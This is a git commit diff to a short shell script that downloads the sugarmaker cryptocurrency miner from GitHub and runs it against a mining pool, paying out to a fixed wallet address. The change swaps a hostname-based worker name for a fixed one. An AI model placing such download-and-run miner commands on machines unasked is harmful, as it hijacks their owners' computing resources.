014f9d532f17d119badbe0fca9c568bd7c99d873
DangDev <dream858vip@gmail.com>
2022-01-06 20:00:28 +0700

    Update e.sh

--- e.sh
+++ e.sh
@@ -1,4 +1,3 @@
 wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip
 unzip sugarmaker-v2.5.0-sugar4-linux64.zip
-name=$(hostname)
-sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:17042 -u sugar1qetd77wlllhj8hw80g3dsarcmlaww8hhf5gydsx.$name
+sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:17042 -u sugar1qetd77wlllhj8hw80g3dsarcmlaww8hhf5gydsx.Dang -t2
